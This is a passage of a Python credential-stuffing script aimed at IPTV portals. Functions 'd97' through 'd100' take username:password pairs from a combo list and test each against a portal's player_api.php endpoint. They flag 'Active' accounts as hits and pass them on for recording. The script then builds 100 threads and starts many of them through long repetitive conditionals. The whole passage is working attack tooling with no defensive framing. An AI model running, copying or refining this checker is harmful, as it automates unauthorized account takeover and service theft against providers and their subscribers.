             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d97():
    global hit
    say=0
    for fyz in range(97,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_97'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d98():
    global hit
    say=0
    for fyz in range(98,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_98'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d99():
    global hit
    say=0
    for fyz in range(99,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_99'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d100():
    global hit
    say=0
    for fyz in range(100,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_100'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

                     

t1 = threading.Thread(target=d1)
t2 = threading.Thread(target=d2)
t3 = threading.Thread(target=d3)
t4 = threading.Thread(target=d4)
t5 = threading.Thread(target=d5)
t6= threading.Thread(target=d6)
t7= threading.Thread(target=d7)
t8= threading.Thread(target=d8)
t9= threading.Thread(target=d9)
t10= threading.Thread(target=d10)
t11= threading.Thread(target=d11)
t12= threading.Thread(target=d12)
t13= threading.Thread(target=d13)
t14= threading.Thread(target=d14)
t15= threading.Thread(target=d15)
t16= threading.Thread(target=d16)
t17= threading.Thread(target=d17)
t18= threading.Thread(target=d18)
t19= threading.Thread(target=d19)
t20= threading.Thread(target=d20)
t21= threading.Thread(target=d21)
t22= threading.Thread(target=d22)
t23= threading.Thread(target=d23)
t24= threading.Thread(target=d24)
t25= threading.Thread(target=d25)
t26= threading.Thread(target=d26)
t27= threading.Thread(target=d27)
t28= threading.Thread(target=d28)
t29= threading.Thread(target=d29)
t30= threading.Thread(target=d30)
t31= threading.Thread(target=d31)
t32= threading.Thread(target=d32)
t33= threading.Thread(target=d33)
t34= threading.Thread(target=d34)
t35= threading.Thread(target=d35)
t36= threading.Thread(target=d36)
t37= threading.Thread(target=d37)
t38= threading.Thread(target=d38)
t39= threading.Thread(target=d39)
t40= threading.Thread(target=d40)
t41= threading.Thread(target=d41)
t42= threading.Thread(target=d42)
t43= threading.Thread(target=d43)
t44= threading.Thread(target=d44)
t45= threading.Thread(target=d45)
t46= threading.Thread(target=d46)
t47= threading.Thread(target=d47)
t48= threading.Thread(target=d48)
t49= threading.Thread(target=d49)
t50= threading.Thread(target=d50)
t51 = threading.Thread(target=d51)


t52 = threading.Thread(target=d52)


t53 = threading.Thread(target=d53)


t54 = threading.Thread(target=d54)


t55 = threading.Thread(target=d55)


t56 = threading.Thread(target=d56)


t57 = threading.Thread(target=d57)


t58 = threading.Thread(target=d58)


t59 = threading.Thread(target=d59)


t60 = threading.Thread(target=d60)


t61 = threading.Thread(target=d61)


t62 = threading.Thread(target=d62)


t63 = threading.Thread(target=d63)


t64 = threading.Thread(target=d64)


t65 = threading.Thread(target=d65)


t66 = threading.Thread(target=d66)


t67 = threading.Thread(target=d67)


t68 = threading.Thread(target=d68)


t69 = threading.Thread(target=d69)


t70 = threading.Thread(target=d70)


t71 = threading.Thread(target=d71)


t72 = threading.Thread(target=d72)


t73 = threading.Thread(target=d73)


t74 = threading.Thread(target=d74)


t75 = threading.Thread(target=d75)


t76 = threading.Thread(target=d76)


t77 = threading.Thread(target=d77)


t78 = threading.Thread(target=d78)


t79 = threading.Thread(target=d79)


t80 = threading.Thread(target=d80)


t81 = threading.Thread(target=d81)


t82 = threading.Thread(target=d82)


t83 = threading.Thread(target=d83)


t84 = threading.Thread(target=d84)


t85 = threading.Thread(target=d85)


t86 = threading.Thread(target=d86)


t87 = threading.Thread(target=d87)


t88 = threading.Thread(target=d88)


t89 = threading.Thread(target=d89)


t90 = threading.Thread(target=d90)


t91 = threading.Thread(target=d91)


t92 = threading.Thread(target=d92)


t93 = threading.Thread(target=d93)


t94 = threading.Thread(target=d94)


t95 = threading.Thread(target=d95)


t96 = threading.Thread(target=d96)


t97 = threading.Thread(target=d97)


t98 = threading.Thread(target=d98)


t99 = threading.Thread(target=d99)


t100 = threading.Thread(target=d100)
t1.start()

if botsay==2 or botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t2.start()
if botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t3.start()
if botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t4.start()
if botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t5.start()
if botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t6.start()
if botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t7.start()
if botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t8.start()
if botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t9.start()
if botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t10.start()
if botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t11.start()
if botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t12.start()
if botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t13.start()
if botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t14.start()
if botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t15.start()    
if botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t16.start()    
if botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t17.start()    
if botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t18.start()    
